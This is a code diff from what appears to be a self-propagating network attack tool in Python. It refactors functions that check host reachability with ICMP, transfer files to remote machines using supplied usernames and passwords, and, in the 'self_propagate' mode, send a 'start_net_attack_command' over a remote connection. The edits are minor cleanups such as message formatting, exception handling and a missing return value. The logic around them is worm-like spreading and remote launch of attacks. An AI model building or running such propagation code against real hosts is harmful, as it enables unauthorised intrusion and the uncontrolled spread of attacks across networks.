@@ -174,8 +174,7 @@ def read_file_from_list(file):
 
 
 def is_reachable(dst_ip, src_ip=None, timeout=2):
-    ip = IP(src=src_ip, dst=dst_ip, ttl=64) if src_ip else IP(dst=dst_ip, ttl=64)
-    ans = sr1(ip / ICMP(), timeout=timeout)
+    ans = sr1(IP(src=src_ip, dst=dst_ip, ttl=64) / ICMP(), timeout=timeout)
     return ans is not None
 
 
@@ -193,9 +192,9 @@ def transfer_file(ip, username, password, port, self_propagate, deployment_filen
                                   script_filename)
 
     if self_propagate:
-        information_message = "Success! %s started on %s\n" % (script_filename, ip) if successful else "Self propagation failed\n"
+        information_message = "Success! %s started on %s" % (script_filename, ip) if successful else "Self propagation failed\n"
     else:
-        information_message = "File deployment successful!\n" if successful else "File deployment failed\n"
+        information_message = "File deployment successful!" if successful else "File deployment failed\n"
 
     print(information_message)
     return successful
@@ -337,11 +336,14 @@ def transfer_file_with_http_server(ip, username, password, target_directory, sel
                 connection.write(password_input)
                 connection.read_until(wait_for, timeout=1)
             connection.write(start_net_attack_command)
-            connection.read_until(wait_for, timeout=1)
-    except:
+
+        connection.read_until(wait_for, timeout=1)
+    except Exception as ex:
         return False
     finally:
         connection.close()
+
+    return True
 
 
 def get_server_ip_from_ip(ip):
